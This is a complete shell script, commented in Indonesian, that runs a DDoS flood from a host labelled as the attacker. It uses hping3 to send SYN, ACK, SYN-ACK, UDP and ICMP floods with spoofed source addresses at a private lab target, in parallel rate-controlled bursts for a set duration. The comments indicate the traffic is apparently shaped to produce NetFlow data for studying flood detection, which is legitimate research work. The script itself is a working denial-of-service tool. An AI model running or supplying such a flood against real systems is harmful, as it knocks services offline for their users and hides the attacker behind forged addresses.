#!/bin/sh
# serang_flood.sh — jalankan di Penyerang-1. DDoS flood dari BANYAK sumber palsu.
#   nohup sh serang_flood.sh 1800 > /tmp/flood.log 2>&1 &
#
# RIWAYAT TUNING:
# - v1 (--flood, port sumber naik tiap paket) -> JUTAAN flow 1-paket (meledak).
# - v2/v3 (--keep, port sumber TETAP sama) -> NetFlow nganggep tiap (src,sport,dst,dport)
#   sebagai 1 flow, dan karena sport dikunci sama, jumlah flow MENTOK di jumlah IP
#   sumber x port tujuan (cuma ~72-150 flow walau paket banyak). Salah.
# - v4 (INI): kunci cara pikir NetFlow = 1 flow per (src_ip, src_port, dst_ip, dst_port).
#   Jadi tiap "burst" = 1 hping pendek dengan src_ip + src_port + dst_port UNIK + `-c`
#   (jumlah paket dibatasi, 30-250 -> flow PADAT, bukan 1 paket). Banyak burst paralel
#   -> jumlah flow terkontrol (ribuan/sesi), tiap flow tetap punya ciri flood kuat.
#   Sumber palsu luas (.10-.250) -> unique_src_ip_per_dst tinggi (fitur yg dulu rusak).
#
# PENTING: reset collector sebelum sesi baru (hapus /data/nfcapd lama / restart nfcapd)
# biar hitungan flow bersih, nggak keakumulasi sesi sebelumnya.

TARGET=192.168.30.10
LAMA=${1:-1800}
SELESAI=$(( $(date +%s) + LAMA ))
rnd() { shuf -i "$1-$2" -n 1; }
dport() { case $(rnd 1 4) in 1|2) echo 80 ;; 3) echo 443 ;; 4) rnd 1 1024 ;; esac; }

while [ "$(date +%s)" -lt "$SELESAI" ]; do
  case $(rnd 1 6) in                      # jenis flood
    1|2) MODE="-S" ;;          # SYN flood
    3)   MODE="-A" ;;          # ACK flood
    4)   MODE="-S -A" ;;       # SYN-ACK
    5)   MODE="--udp" ;;       # UDP flood
    6)   MODE="--icmp" ;;      # ICMP flood
  esac
  BATCH=$(rnd 10 20)                      # berapa burst paralel per putaran
  k=0
  while [ $k -lt $BATCH ]; do
    SRC="192.168.20.$(rnd 10 250)"        # IP sumber palsu (unik-ish)
    SPORT=$(rnd 1025 60000)               # port sumber tetap per-burst -> 1 flow padat
    NPKT=$(rnd 30 250)                    # jumlah paket per flow (padat, bukan 1)
    LAJU="-i u$(rnd 800 8000)"            # 125-1250 paket/detik
    DATA=$(rnd 0 1200)                    # payload acak -> avg_packet_size bervariasi
    # --keep + -s SPORT: port sumber dikunci di SPORT ini -> seluruh burst = 1 flow
    timeout 6 hping3 $MODE --keep -s "$SPORT" -p "$(dport)" -c "$NPKT" $LAJU -d "$DATA" \
      -a "$SRC" "$TARGET" >/dev/null 2>&1 &
    k=$((k + 1))
  done
  wait
  sleep "$(rnd 1 2)"
done
